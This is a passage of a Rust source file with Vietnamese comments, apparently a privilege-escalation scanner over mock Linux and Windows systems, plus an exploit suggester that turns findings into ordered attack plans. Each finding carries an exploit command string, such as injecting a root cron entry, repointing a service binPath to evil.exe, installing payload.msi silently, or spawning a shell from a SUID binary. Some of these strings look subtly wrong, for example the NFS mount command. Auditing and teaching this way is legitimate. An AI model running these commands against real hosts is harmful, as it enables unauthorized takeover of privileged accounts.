    /// Các phát hiện tích lũy từ lần quét gần nhất.
    pub findings: Vec<Finding>,
}

impl LinuxPrivEscChecker {
    /// Tạo bộ dò với một hệ thống tệp mô phỏng.
    pub fn new(fs: MockFilesystem) -> Self {
        Self {
            fs,
            findings: Vec::new(),
        }
    }

    /// Quét toàn bộ và trả về danh sách phát hiện đã sắp xếp theo mức nghiêm trọng.
    pub fn scan(&mut self) -> Vec<Finding> {
        self.findings.clear();
        self.check_suid_binaries();
        self.check_sudoers();
        self.check_cron_jobs();
        self.check_capabilities();
        self.check_world_writable_paths();
        self.check_nfs_exports();
        self.check_dangerous_symlinks();
        self.findings.sort_by(|a, b| {
            b.severity
                .cmp(&a.severity)
                .then_with(|| a.technique.cmp(&b.technique))
                .then_with(|| a.path.cmp(&b.path))
        });
        self.findings.clone()
    }

    /// Dò các nhị phân có cờ SUID hoặc SGID.
    ///
    /// Mức nghiêm trọng tăng dần theo thứ tự:
    /// SUID thuộc `root` **và** có trong [`gtfo_bins`] → `Critical`;
    /// SUID thuộc người không phải `root` → `Critical` (đây là cấu hình sai lệch hiếm gặp
    /// nhưng cực kỳ nguy hiểm); SUID của `root` không có payload → `High`;
    /// chỉ có SGID → `Medium`.
    pub fn check_suid_binaries(&mut self) -> Vec<Finding> {
        let mut out = Vec::new();
        for (path, payload) in self.fs.suid_binaries_with_payloads() {
            let Some(file) = self.fs.get(&path) else {
                continue;
            };
            let (mode, owner, group) = (file.mode, file.owner.clone(), file.group.clone());
            let suid = mode & S_IFUID != 0;
            let sgid = mode & S_IFGID != 0;
            let severity = if owner != "root" || payload.is_some() {
                Severity::Critical
            } else if suid {
                Severity::High
            } else {
                Severity::Medium
            };
            let technique = if suid { "SuidBinary" } else { "SgidBinary" };
            let exploit = match &payload {
                Some(payload) => format!("{path}  # payload: {payload}"),
                None => format!("sudo -u root {path}"),
            };
            let detail = format!(
                "Tệp thực thi có SUID={suid} SGID={sgid}, quyền {mode:04o}, chủ sở hữu `{owner}`, nhóm `{group}`. \
                 Khi chạy, tiến trình sẽ kế thừa quyền của chủ sở hữu."
            );
            let evidence = format!(
                "ls -l {path}  ->  mode={mode:04o} owner={owner} group={group} suid={suid} sgid={sgid}"
            );
            let finding = Finding::new(
                technique,
                &format!(
                    "Nhị phân SUID/SGID có thể dùng để leo thang: {}",
                    base_name(&path)
                ),
                severity,
                Platform::Linux,
            )
            .with_path(&path)
            .with_detail(&detail)
            .with_exploit(&exploit)
            .with_evidence(&evidence);
            self.findings.push(finding.clone());
            out.push(finding);
        }
        out
    }

    /// Dò cấu hình `sudoers` cho phép chạy lệnh không cần mật khẩu.
    pub fn check_sudoers(&mut self) -> Vec<Finding> {
        let mut out = Vec::new();
        let candidates: Vec<String> = self
            .fs
            .path_list()
            .iter()
            .map(|p| p.to_string_lossy().to_string())
            .filter(|p| p == "/etc/sudoers" || p.starts_with("/etc/sudoers.d/"))
            .collect();

        for path in candidates {
            let Some(file) = self.fs.get(&path) else {
                continue;
            };
            let content = String::from_utf8_lossy(&file.content).to_string();
            for (index, raw_line) in content.lines().enumerate() {
                let line = raw_line.trim();
                if line.is_empty() || line.starts_with('#') {
                    continue;
                }
                let fields: Vec<&str> = line.split_whitespace().collect();
                if fields.len() < 2 {
                    continue;
                }
                let option_index = fields.iter().position(|f| f.ends_with(':'));
                let runas_index = fields.iter().position(|f| f.contains('='));
                let command_start = match (option_index, runas_index) {
                    (Some(opt), _) => opt + 1,
                    (None, Some(runas)) => runas + 1,
                    (None, None) => 1,
                };
                let commands = fields[command_start.min(fields.len())..].join(" ");
                if commands.is_empty() {
                    continue;
                }
                let no_password = fields.iter().any(|f| {
                    f.eq_ignore_ascii_case("NOPASSWD:") || f.eq_ignore_ascii_case("NOPASSWD")
                });
                let grants_all = commands.split(',').any(|c| c.trim() == "ALL");
                let severity = if no_password && grants_all {
                    Severity::Critical
                } else if no_password {
                    Severity::High
                } else if grants_all {
                    Severity::Low
                } else {
                    Severity::Medium
                };
                let detail = format!(
                    "Quy tắc sudoers tại dòng {}: lệnh được cấp quyền `{commands}`; \
                     yêu cầu mật khẩu = {}.",
                    index + 1,
                    if no_password { "không" } else { "có" }
                );
                let exploit = if grants_all {
                    "sudo /bin/bash".to_string()
                } else {
                    format!("sudo {commands}")
                };
                let evidence = format!("{path}:{index}  ->  {line}");
                let finding = Finding::new(
                    "SudoMisconfig",
                    "Cấu hình sudoers cho phép leo thang không cần mật khẩu",
                    severity,
                    Platform::Linux,
                )
                .with_path(&path)
                .with_detail(&detail)
                .with_exploit(&exploit)
                .with_evidence(&evidence);
                self.findings.push(finding.clone());
                out.push(finding);
            }
        }
        out
    }

    /// Dò cron job mà kẻ tấn công có thể thay đổi lệnh thực thi.
    pub fn check_cron_jobs(&mut self) -> Vec<Finding> {
        let mut out = Vec::new();
        let candidates: Vec<String> = self
            .fs
            .path_list()
            .iter()
            .map(|p| p.to_string_lossy().to_string())
            .filter(|p| {
                p == "/etc/crontab"
                    || p == "/etc/anacrontab"
                    || p.starts_with("/etc/cron.d/")
                    || p.starts_with("/var/spool/cron/")
            })
            .collect();

        for path in candidates {
            let Some(file) = self.fs.get(&path) else {
                continue;
            };
            let content = String::from_utf8_lossy(&file.content).to_string();

            // Trường hợp 1: bản thân tệp crontab ghi được bởi mọi người.
            if file.mode & 0o002 != 0 {
                let finding = Finding::new(
                    "CronJob",
                    "Tệp crontab ghi được bởi mọi người — kẻ tấn công tự chèn được lệnh",
                    Severity::High,
                    Platform::Linux,
                )
                .with_path(&path)
                .with_detail(format!(
                    "Tệp cron `{path}` có quyền {:04o} (ghi cho mọi người).",
                    file.mode
                ))
                .with_exploit("printf '\\n* * * * * root /tmp/payload.sh\\n' | crontab -")
                .with_evidence(format!(
                    "stat -c '%a %U %n' {path}  ->  mode={:04o}",
                    file.mode
                ));
                self.findings.push(finding.clone());
                out.push(finding);
            }

            // Trường hợp 2: lệnh trong cron trỏ tới tệp mà kẻ tấn công sở hữu/ghi được.
            for (index, raw_line) in content.lines().enumerate() {
                let line = raw_line.trim();
                if line.is_empty() || line.starts_with('#') {
                    continue;
                }
                let fields: Vec<&str> = line.split_whitespace().collect();
                if fields.len() < 2 {
                    continue;
                }
                // Định dạng crontab hệ thống: 5 trường lịch + user + lệnh.
                // Định dạng crontab người dùng: 5 trường lịch + lệnh (không có user).
                // Định dạng đặc biệt: "@reboot lệnh".
                let (user, command_fields): (String, &[&str]) = if fields[0].starts_with('@') {
                    ("root".to_string(), &fields[1..])
                } else if fields.len() >= 7 {
                    (fields[5].to_string(), &fields[6..])
                } else if fields.len() == 6 {
                    ("root".to_string(), &fields[5..])
                } else {
                    continue;
                };
                for token in command_fields {
                    if !token.starts_with('/') {
                        continue;
                    }
                    let world_writable = self.fs.is_world_writable(token);
                    let owner_writable = self.fs.is_writable_by(token, ATTACKER_USER);
                    if !world_writable && !owner_writable {
                        continue;
                    }
                    let severity = if world_writable {
                        Severity::Critical
                    } else {
                        Severity::High
                    };
                    let detail = format!(
                        "Cron chạy với tài khoản `{user}` nhưng gọi tới `{token}` \
                         mà kẻ tấn công có thể ghi đè (ghi cho mọi người = {world_writable})."
                    );
                    let exploit =
                        format!("cp /tmp/payload.sh {token}   # chèn payload vào script cron");
                    let evidence = format!("{path}:{index}  ->  {line}");
                    let finding = Finding::new(
                        "CronJob",
                        "Cron job gọi tới tệp có thể bị thay đổi",
                        severity,
                        Platform::Linux,
                    )
                    .with_path(token)
                    .with_detail(&detail)
                    .with_exploit(&exploit)
                    .with_evidence(&evidence);
                    self.findings.push(finding.clone());
                    out.push(finding);
                }
            }
        }
        out
    }

    /// Dò các tệp nhị phân được gán Linux capability nguy hiểm.
    ///
    /// Quy ước khai báo capability: tệp metadata `<đường-dẫn-nhị-phân>.cap` chứa danh sách
    /// capability, ví dụ `/opt/app/tool.cap` chứa `cap_setuid,cap_net_raw=ep`.
    /// Ngoài ra, một tệp nhị phân còn có thể khai báo capability ngay trong nội dung với
    /// tiền tố `#caps=`.
    pub fn check_capabilities(&mut self) -> Vec<Finding> {
        const DANGEROUS_CAPS: [&str; 5] = [
            "cap_setuid",
            "cap_setgid",
            "cap_sys_admin",
            "cap_dac_override",
            "cap_chroot",
        ];
        let mut out = Vec::new();
        for path in self.fs.path_list() {
            let path_str = path.to_string_lossy().to_string();
            let Some(file) = self.fs.get(&path_str) else {
                continue;
            };
            let content = String::from_utf8_lossy(&file.content).to_string();
            let (binary, caps) = if let Some(stripped) = path_str.strip_suffix(".cap") {
                (stripped.to_string(), content.trim().to_string())
            } else if let Some(rest) = content.strip_prefix("#caps=") {
                (path_str.clone(), rest.trim().to_string())
            } else {
                continue;
            };
            if caps.is_empty() || !self.fs.exists(&binary) {
                continue;
            }
            let dangerous = DANGEROUS_CAPS.iter().any(|cap| caps.contains(cap));
            let severity = if dangerous {
                Severity::Critical
            } else {
                Severity::Medium
            };
            let detail = format!(
                "Tệp `{binary}` được gán capability `{caps}`. \
                 Capability cho phép vượt qua kiểm tra quyền mà không cần SUID."
            );
            let exploit = format!("capsh --print -- '{binary}'   # liệt kê capability đang có");
            let evidence = format!("getcap {binary}  ->  {caps}");
            let finding = Finding::new(
                "Capabilities",
                "Linux capability nguy hiểm gán cho tệp thực thi",
                severity,
                Platform::Linux,
            )
            .with_path(&binary)
            .with_detail(&detail)
            .with_exploit(&exploit)
            .with_evidence(&evidence);
            self.findings.push(finding.clone());
            out.push(finding);
        }
        out
    }

    /// Dò các tệp ghi được bởi mọi người, đặc biệt là tệp nhạy cảm hoặc tệp trong `PATH`.
    pub fn check_world_writable_paths(&mut self) -> Vec<Finding> {
        let mut out = Vec::new();
        for path in self.fs.path_list() {
            let path_str = path.to_string_lossy().to_string();
            let Some(file) = self.fs.get(&path_str) else {
                continue;
            };
            if file.mode & 0o002 == 0 {
                continue;
            }
            // Liên kết tượng được kiểm tra riêng bởi `check_dangerous_symlinks`.
            if file.is_symlink {
                continue;
            }
            let parent = parent_path(&path_str);
            let in_path_dir = PATH_DIRECTORIES.contains(&parent.as_str());
            let sensitive = is_sensitive_path(&path_str);
            let technique = if in_path_dir {
                "WritablePath"
            } else {
                "WorldWritablePath"
            };
            let severity = if sensitive {
                Severity::Critical
            } else if in_path_dir {
                Severity::High
            } else {
                Severity::Medium
            };
            let title = if in_path_dir {
                format!("Thư mục trong PATH chứa tệp ghi được bởi mọi người: {path_str}")
            } else {
                format!("Tệp ghi được bởi mọi người: {path_str}")
            };
            let detail = format!(
                "Tệp `{path_str}` có quyền {:04o}. \
                 Nếu tệp nằm trong `PATH` thì kẻ tấn công có thể thay thế lệnh hệ thống; \
                 nếu là tệp cấu hình nhạy cảm thì có thể ghi vào cấu hình khởi động.",
                file.mode
            );
            let exploit = format!("cp /tmp/payload {path_str}");
            let evidence = format!(
                "ls -l {path_str}  ->  mode={:04o} owner={}",
                file.mode, file.owner
            );
            let finding = Finding::new(technique, &title, severity, Platform::Linux)
                .with_path(&path_str)
                .with_detail(&detail)
                .with_exploit(&exploit)
                .with_evidence(&evidence);
            self.findings.push(finding.clone());
            out.push(finding);
        }
        out
    }

    /// Dò các bản xuất NFS không bóp nẹp quyền root (`no_root_squash`).
    pub fn check_nfs_exports(&mut self) -> Vec<Finding> {
        let mut out = Vec::new();
        let candidates: Vec<String> = self
            .fs
            .path_list()
            .iter()
            .map(|p| p.to_string_lossy().to_string())
            .filter(|p| p == "/etc/exports" || p.starts_with("/etc/exports.d/"))
            .collect();

        for path in candidates {
            let Some(file) = self.fs.get(&path) else {
                continue;
            };
            let content = String::from_utf8_lossy(&file.content).to_string();
            for (index, raw_line) in content.lines().enumerate() {
                let line = raw_line.trim();
                if line.is_empty() || line.starts_with('#') {
                    continue;
                }
                let options = match (line.find('('), line.rfind(')')) {
                    (Some(start), Some(end)) if end > start => &line[start + 1..end],
                    _ => "",
                };
                if options.is_empty() {
                    continue;
                }
                let no_root_squash = options.contains("no_root_squash");
                let writable = options.contains("rw");
                if !no_root_squash && !writable {
                    continue;
                }
                let severity = if no_root_squash {
                    Severity::Critical
                } else {
                    Severity::Low
                };
                let detail = if no_root_squash {
                    format!(
                        "Bản xuất NFS `{line}` dùng `no_root_squash`: người dùng từ xa \
                         được giữ quyền root khi truy cập, nên chỉ cần ghi vào tệp thuộc \
                         thư mục xuất là leo thang được."
                    )
                } else {
                    format!("Bản xuất NFS `{line}` cho phép ghi, cần kết hợp kỹ thuật khác.")
                };
                let exploit =
                    format!("sudo mount -t nfs {path} /mnt/nfs -o noexec,nosuid && sudo -i");
                let evidence = format!("{path}:{index}  ->  {line}");
                let finding = Finding::new(
                    "NfsNoRootSquash",
                    "Bản xuất NFS cho phép giữ quyền root từ xa",
                    severity,
                    Platform::Linux,
                )
                .with_path(&path)
                .with_detail(&detail)
                .with_exploit(&exploit)
                .with_evidence(&evidence);
                self.findings.push(finding.clone());
                out.push(finding);
            }
        }
        out
    }

    /// Dò liên kết tượng trỏ tới tệp nhạy cảm — một dạng "đánh cắp" tệp cấu hình.
    fn check_dangerous_symlinks(&mut self) -> Vec<Finding> {
        let mut out = Vec::new();
        for path in self.fs.path_list() {
            let path_str = path.to_string_lossy().to_string();
            let Some(file) = self.fs.get(&path_str) else {
                continue;
            };
            if !file.is_symlink {
                continue;
            }
            let Some(target) = file.symlink_target.as_ref() else {
                continue;
            };
            let target_str = target.to_string_lossy().to_string();
            if !is_sensitive_path(&target_str) || !self.fs.exists(&target_str) {
                continue;
            }
            let detail = format!(
                "Liên kết tượng `{path_str}` trỏ tới tệp nhạy cảm `{target_str}`. \
                 Ai kiểm soát được liên kết hoặc tệp đích đều có thể đọc/chỉnh sửa tệp đích."
            );
            let finding = Finding::new(
                "DangerousSymlink",
                "Liên kết tượng trỏ tới tệp cấu hình nhạy cảm",
                Severity::Medium,
                Platform::Linux,
            )
            .with_path(&path_str)
            .with_detail(&detail)
            .with_exploit(format!("cat {target_str}"))
            .with_evidence(format!("readlink {path_str}  ->  {target_str}"));
            self.findings.push(finding.clone());
            out.push(finding);
        }
        out
    }
}

// ============================================================================
// 8. BỘ DÒ LỖ HỔNG LEO THANG QUYỀN TRÊN WINDOWS
// ============================================================================

/// Bộ dò lỗ hổng leo thang quyền trên nền tảng Windows.
///
/// Sáu hướng dò được hỗ trợ:
/// 1. Mạo danh token (`RestrictAnonymous = 0`) — nền tảng của các kỹ thuật kiểu `potato`.
/// 2. Đường dẫn dịch vụ không đặt trong ngoặc kép (`Unquoted Service Path`).
/// 3. Quyền ghi yếu trên tệp nhị phân của dịch vụ (`Weak Service Permissions`).
/// 4. `AlwaysInstallElevated` kết hợp UAC bị tắt.
/// 5. Chiếm quyền thư viện DLL (`DLL Hijacking`).
/// 6. Mật khẩu dịch vụ lưu dạng bản rõ trong sổ đăng ký.
#[derive(Debug, Clone)]
pub struct WindowsPrivEscChecker {
    /// Hệ thống tệp mô phỏng (chứa các tệp nhị phân của dịch vụ).
    pub fs: MockFilesystem,
    /// Sổ đăng ký Windows mô phỏng.
    pub registry: MockRegistry,
    /// Các phát hiện tích lũy từ lần quét gần nhất.
    pub findings: Vec<Finding>,
}

impl WindowsPrivEscChecker {
    /// Tạo bộ dò với hệ thống tệp và sổ đăng ký mô phỏng.
    pub fn new(fs: MockFilesystem, registry: MockRegistry) -> Self {
        Self {
            fs,
            registry,
            findings: Vec::new(),
        }
    }

    /// Quét toàn bộ và trả về danh sách phát hiện đã sắp xếp theo mức nghiêm trọng.
    pub fn scan(&mut self) -> Vec<Finding> {
        self.findings.clear();
        self.check_token_impersonation();
        self.check_unquoted_service_paths();
        self.check_weak_service_permissions();
        self.check_always_install_elevated();
        self.check_dll_hijacking();
        self.check_cleartext_passwords();
        self.findings.sort_by(|a, b| {
            b.severity
                .cmp(&a.severity)
                .then_with(|| a.technique.cmp(&b.technique))
                .then_with(|| a.path.cmp(&b.path))
        });
        self.findings.clone()
    }

    /// Dò cấu hình LSA cho phép mạo danh token ẩn danh.
    ///
    /// `RestrictAnonymous = 0` (hoặc `EveryoneIncludesAnonymous = 1`) mở đường cho các
    /// kỹ thuật kiểu `potato`: ép dịch vụ hệ thống tạo token đặc quyền rồi chiếm quyền.
    pub fn check_token_impersonation(&mut self) -> Vec<Finding> {
        const LSA_KEY: &str = "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa";
        let mut out = Vec::new();
        let mut push = |finding: Finding, out: &mut Vec<Finding>| {
            self.findings.push(finding.clone());
            out.push(finding);
        };

        if self.registry.get_value(LSA_KEY, "RestrictAnonymous") == Some("0") {
            let finding = Finding::new(
                "TokenImpersonation",
                "Ẩn danh được cho phép — có thể mạo danh token đặc quyền",
                Severity::Critical,
                Platform::Windows,
            )
            .with_path(LSA_KEY)
            .with_detail(
                "`RestrictAnonymous = 0` cho phép các phiên ẩn danh tạo token NT với \
                 quyền của dịch vụ hệ thống, mở đường cho kỹ thuật kiểu `potato`.",
            )
            .with_exploit("potato.exe")
            .with_evidence("reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v RestrictAnonymous  ->  0x0");
            push(finding, &mut out);
        }

        if self
            .registry
            .get_value(LSA_KEY, "EveryoneIncludesAnonymous")
            == Some("1")
        {
            let finding = Finding::new(
                "TokenImpersonation",
                "Nhóm Everyone bao gồm SID ẩn danh",
                Severity::High,
                Platform::Windows,
            )
            .with_path(LSA_KEY)
            .with_detail(
                "`EveryoneIncludesAnonymous = 1` khiến mọi SID ẩn danh đều được \
                 tính là thành viên của nhóm Everyone, mở rộng bề mặt tấn công mạo danh token.",
            )
            .with_exploit("whoami /groups")
            .with_evidence("reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v EveryoneIncludesAnonymous  ->  0x1");
            push(finding, &mut out);
        }

        out
    }

    /// Dò đường dẫn tới tệp thực thi của dịch vụ không được đặt trong ngoặc kép.
    ///
    /// Khi `ImagePath` chứa khoảng trắng mà không có dấu `"`, Windows sẽ thử lần lượt
    /// các tiền tố đường dẫn. Nếu một thư mục trong chuỗi tiền tố nằm trong tay kẻ tấn công,
    /// họ có thể chèn tệp thực thi của mình vào đó.
    pub fn check_unquoted_service_paths(&mut self) -> Vec<Finding> {
        let mut out = Vec::new();
        for service in self.registry.services() {
            let image_path = service.image_path.trim();
            if image_path.is_empty() || image_path.starts_with('"') || !image_path.contains(' ') {
                continue;
            }
            let prefix = image_path.split(' ').next().unwrap_or(image_path);
            let writable = self.directory_writable(prefix);
            let severity = if writable {
                Severity::Critical
            } else {
                Severity::High
            };
            let detail = format!(
                "`ImagePath` = `{image_path}` không có dấu ngoặc kép. \
                 Windows sẽ thử chạy `{prefix}` trước; thư mục này \
                 {} cho phép ghi, nên kẻ tấn công có thể chèn tệp thực thi thay thế.",
                if writable {
                    "đang nằm trong tay kẻ tấn công"
                } else {
                    "chưa xác nhận được ghi được"
                }
            );
            let exploit = format!(
                "sc.exe config {} binPath= \"C:\\Program Files\\evil.exe\" start= auto && net start {}",
                service.name, service.name
            );
            let evidence = format!(
                "reg query \"{}\" /v ImagePath  ->  {image_path}",
                service.key_path
            );
            let finding = Finding::new(
                "UnquotedServicePath",
                "Đường dẫn dịch vụ không đặt trong ngoặc kép",
                severity,
                Platform::Windows,
            )
            .with_path(&service.name)
            .with_detail(&detail)
            .with_exploit(&exploit)
            .with_evidence(&evidence);
            self.findings.push(finding.clone());
            out.push(finding);
        }
        out
    }

    /// Dò dịch vụ mà tệp nhị phân của nó có thể bị ghi đè.
    pub fn check_weak_service_permissions(&mut self) -> Vec<Finding> {
        let mut out = Vec::new();
        for service in self.registry.services() {
            let binary = unquote_path(&service.image_path).to_string();
            if binary.is_empty() {
                continue;
            }
            let Some(file) = self.fs.get(&binary) else {
                continue;
            };
            let world_writable = file.mode & 0o002 != 0;
            let trusted_owner = matches!(
                file.owner.as_str(),
                "SYSTEM" | "LocalSystem" | "Administrator" | "NT AUTHORITY\\SYSTEM"
            );
            if !world_writable && trusted_owner {
                continue;
            }
            let severity = if world_writable {
                Severity::High
            } else {
                Severity::Medium
            };
            let detail = format!(
                "Tệp thực thi `{binary}` của dịch vụ `{}` có quyền {:04o} và chủ sở hữu `{}`. \
                 Ghi đè được tệp này đồng nghĩa với thực thi mã với quyền của dịch vụ.",
                service.name, file.mode, file.owner
            );
            let exploit = format!(
                "sc.exe config {} binPath= \"C:\\tmp\\evil.exe\" start= auto && net start {}",
                service.name, service.name
            );
            let evidence = format!(
                "icacls \"{binary}\"  ->  quyền {:04o}, chủ sở hữu {}",
                file.mode, file.owner
            );
            let finding = Finding::new(
                "WeakServicePermissions",
                "Quyền ghi trên tệp nhị phân của dịch vụ quá rộng",
                severity,
                Platform::Windows,
            )
            .with_path(&service.name)
            .with_detail(&detail)
            .with_exploit(&exploit)
            .with_evidence(&evidence);
            self.findings.push(finding.clone());
            out.push(finding);
        }
        out
    }

    /// Dò chính sách `AlwaysInstallElevated` kết hợp với UAC bị tắt.
    pub fn check_always_install_elevated(&mut self) -> Vec<Finding> {
        const POLICY_KEY: &str =
            "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
        let mut out = Vec::new();
        let enable_lua = self.registry.get_value(POLICY_KEY, "EnableLUA");
        let always_install = self.registry.get_value(POLICY_KEY, "AlwaysInstallElevated");

        if always_install == Some("1") && enable_lua == Some("0") {
            let finding = Finding::new(
                "AlwaysInstallElevated",
                "AlwaysInstallElevated bật đồng thời UAC bị tắt",
                Severity::Critical,
                Platform::Windows,
            )
            .with_path(POLICY_KEY)
            .with_detail(
                "Khi cả `AlwaysInstallElevated = 1` và `EnableLUA = 0` đều được đặt, \
                 mọi tệp MSI do người dùng tải về đều được cài với quyền SYSTEM mà \
                 không cần bất kỳ lời nhắc UAC nào.",
            )
            .with_exploit("msiexec /i payload.msi /qn")
            .with_evidence(
                "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" \
                 /v AlwaysInstallElevated  ->  0x1",
            );
            self.findings.push(finding.clone());
            out.push(finding);
        } else if enable_lua == Some("0") {
            let finding = Finding::new(
                "AlwaysInstallElevated",
                "User Account Control (UAC) đã bị tắt",
                Severity::High,
                Platform::Windows,
            )
            .with_path(POLICY_KEY)
            .with_detail(
                "`EnableLUA = 0` tắt hoàn toàn cơ chế kiểm soát tài khoản người dùng, \
                 khiến mọi quy trình chạy với quyền của người đăng nhập mà không cảnh báo.",
            )
            .with_exploit("whoami /groups")
            .with_evidence(
                "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" \
                 /v EnableLUA  ->  0x0",
            );
            self.findings.push(finding.clone());
            out.push(finding);
        }
        out
    }

    /// Dò khả năng chiếm quyền thư viện DLL của dịch vụ.
    pub fn check_dll_hijacking(&mut self) -> Vec<Finding> {
        let mut out = Vec::new();
        for service in self.registry.services() {
            let candidate = service.service_dll.clone().or_else(|| {
                let image = unquote_path(&service.image_path);
                if image.to_lowercase().ends_with(".dll") {
                    Some(image.to_string())
                } else {
                    None
                }
            });
            let Some(dll) = candidate else {
                continue;
            };
            let directory = parent_path(&dll);
            let dll_world_writable = self.fs.is_world_writable(&dll);
            let directory_writable = self.directory_writable(&directory);
            if !dll_world_writable && !directory_writable {
                continue;
            }
            let detail = format!(
                "Dịch vụ `{}` nạp thư viện `{dll}`. Thư mục `{}` {} cho phép ghi, \
                 nên kẻ tấn công có thể đặt DLL độc hại cùng tên để nạp vào tiến trình dịch vụ.",
                service.name,
                directory,
                if directory_writable {
                    "đang"
                } else {
                    "không"
                }
            );
            let exploit = format!("cp hijacked.dll \"{directory}\\{}\"", base_name(&dll));
            let evidence = format!(
                "reg query \"{}\" /v ServiceDll  ->  {dll}",
                service.key_path
            );
            let finding = Finding::new(
                "DllHijack",
                "Dịch vụ nạp thư viện DLL nằm trong thư mục có thể ghi",
                Severity::High,
                Platform::Windows,
            )
            .with_path(&dll)
            .with_detail(&detail)
            .with_exploit(&exploit)
            .with_evidence(&evidence);
            self.findings.push(finding.clone());
            out.push(finding);
        }
        out
    }

    /// Dò mật khẩu dịch vụ lưu dạng bản rõ trong sổ đăng ký.
    pub fn check_cleartext_passwords(&mut self) -> Vec<Finding> {
        let mut out = Vec::new();
        for service in self.registry.services() {
            let mut names: Vec<&String> = service.values.keys().collect();
            names.sort();
            for name in names {
                let value = &service.values[name];
                let lower = name.to_lowercase();
                let is_password_field =
                    lower.contains("password") || lower.contains("passwd") || lower == "credential";
                if !is_password_field {
                    continue;
                }
                let looks_protected = value.starts_with("S-1-")
                    || (value.len() == 32 && value.chars().all(|c| c.is_ascii_hexdigit()));
                if looks_protected {
                    continue;
                }
                let finding = Finding::new(
                    "CleartextPassword",
                    "Mật khẩu dịch vụ lưu dạng bản rõ trong sổ đăng ký",
                    Severity::High,
                    Platform::Windows,
                )
                .with_path(&service.name)
                .with_detail(format!(
                    "Giá trị `{name}` của dịch vụ `{}` chứa mật khẩu bản rõ thay vì SID \
                     hoặc băm NT. Ai đọc được sổ đăng ký đều lấy được mật khẩu này.",
                    service.name
                ))
                .with_exploit(format!(
                    "net stop {} && net start {}",
                    service.name, service.name
                ))
                .with_evidence(format!(
                    "reg query \"{}\" /v {name}  ->  {value}",
                    service.key_path
                ));
                self.findings.push(finding.clone());
                out.push(finding);
            }
        }
        out
    }

    /// Kiểm tra một thư mục có chứa tệp ghi được bởi mọi người hay không.
    ///
    /// Xấp xỉ thực tế: thư mục được coi là "nằm trong tay kẻ tấn công" nếu bên trong nó
    /// tồn tại ít nhất một tệp có quyền ghi cho mọi người.
    fn directory_writable(&self, directory: &str) -> bool {
        if directory.is_empty() {
            return false;
        }
        self.fs.path_list().iter().any(|path| {
            let path_str = path.to_string_lossy().to_string();
            parent_path(&path_str) == directory && self.fs.is_world_writable(&path_str)
        })
    }
}

// ============================================================================
// 9. BỘ GỢI Ý KHAI THÁC (EXPLOIT SUGGESTER)
// ============================================================================

/// Một kỹ thuật khai thác được gợi ý cho tác tử.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ExploitTechnique {
    /// Tên kỹ thuật, trùng với `Finding.technique` để ánh xạ hai chiều.
    pub name: String,
    /// Mức nghiêm trọng của kỹ thuật.
    pub severity: Severity,
    /// Mẫu lệnh khai thác; chuỗi `{target}` sẽ được thay bằng đường dẫn đích.
    pub command_template: String,
    /// Mô tả ngắn gọn cơ chế khai thác.
    pub description: String,
    /// Các điều kiện tiên quyết phải thoả mãn.
    pub preconditions: Vec<String>,
}

/// Trích xuất mục tiêu hành động cụ thể từ một phát hiện.
///
/// Với đa số kỹ thuật, mục tiêu chính là đường dẫn tệp đã ghi nhận trong phát hiện.
/// Vài kỹ thuật cần mục tiêu riêng: `SudoMisconfig` hành động trên *lệnh* được cấp quyền
/// (trích ở cuối chuỗi lệnh khai thác), còn `AlwaysInstallElevated` và `TokenImpersonation`
/// hành động trên *tệp đóng gói* / *công cụ*, không phải trên khóa sổ đăng ký.
pub fn action_target(finding: &Finding) -> String {
    match finding.technique.as_str() {
        "SudoMisconfig" => finding
            .exploit_command
            .split_whitespace()
            .last()
            .filter(|token| token.starts_with('/'))
            .map(|token| token.to_string())
            .unwrap_or_else(|| finding.path.clone()),
        "AlwaysInstallElevated" => "payload.msi".to_string(),
        "TokenImpersonation" => "potato.exe".to_string(),
        _ => finding.path.clone(),
    }
}

/// Bộ gợi ý khai thác: biến danh sách phát hiện thành một kế hoạch hành động có thứ tự.
#[derive(Debug, Clone)]
pub struct ExploitSuggester {
    /// Bảng kỹ thuật tham chiếu (15 mục).
    pub techniques: Vec<ExploitTechnique>,
}

impl Default for ExploitSuggester {
    fn default() -> Self {
        Self::new()
    }
}

impl ExploitSuggester {
    /// Tạo bộ gợi ý với bảng kỹ thuật tham chiếu đầy đủ.
    pub fn new() -> Self {
        let techniques = vec![
            ExploitTechnique {
                name: "SuidBinary".to_string(),
                severity: Severity::Critical,
                command_template: "{target} -c '/bin/sh'".to_string(),
                description: "Khai thác nhị phân SUID để thừa hưởng quyền của chủ sở hữu tệp."
                    .to_string(),
                preconditions: vec![
                    "Tệp có cờ SUID và thuộc về root".to_string(),
                    "Payload phù hợp với chương trình cụ thể (xem bảng GTFOBins)".to_string(),
                ],
            },
            ExploitTechnique {
                name: "SgidBinary".to_string(),
                severity: Severity::Medium,
                command_template: "{target} -c '/bin/sh'".to_string(),
                description: "Khai thác nhị phân SGID để thừa hưởng quyền nhóm của tệp."
                    .to_string(),
                preconditions: vec!["Tệp có cờ SGID".to_string()],
            },
            ExploitTechnique {
                name: "SudoMisconfig".to_string(),
                severity: Severity::Critical,
                command_template: "sudo {target}".to_string(),
                description: "Dùng quy tắc sudo cho phép chạy lệnh không cần mật khẩu.".to_string(),
                preconditions: vec![
                    "Có quy tắc NOPASSWD trong /etc/sudoers".to_string(),
                    "Lệnh được cấp quyền tồn tại trên máy chủ".to_string(),
                ],
            },
            ExploitTechnique {
                name: "CronJob".to_string(),
                severity: Severity::Critical,
                command_template: "crontab -e  # thay lệnh trong {target}".to_string(),
                description: "Chiếm quyền qua cron job gọi tới tệp có thể chỉnh sửa.".to_string(),
                preconditions: vec![
                    "Tệp được cron gọi tới nằm trong tay kẻ tấn công".to_string(),
                    "Cron chạy với tài khoản đặc quyền".to_string(),
                ],
            },
            ExploitTechnique {
                name: "WritablePath".to_string(),
                severity: Severity::High,
                command_template: "export PATH=/tmp:$PATH; {target}".to_string(),
                description: "Thay thế lệnh hệ thống bằng bản giả trong thư mục `PATH` ghi được."
                    .to_string(),
                preconditions: vec![
                    "Thư mục nằm trong PATH và ghi được bởi kẻ tấn công".to_string(),
                ],
            },
            ExploitTechnique {
                name: "Capabilities".to_string(),
                severity: Severity::Critical,
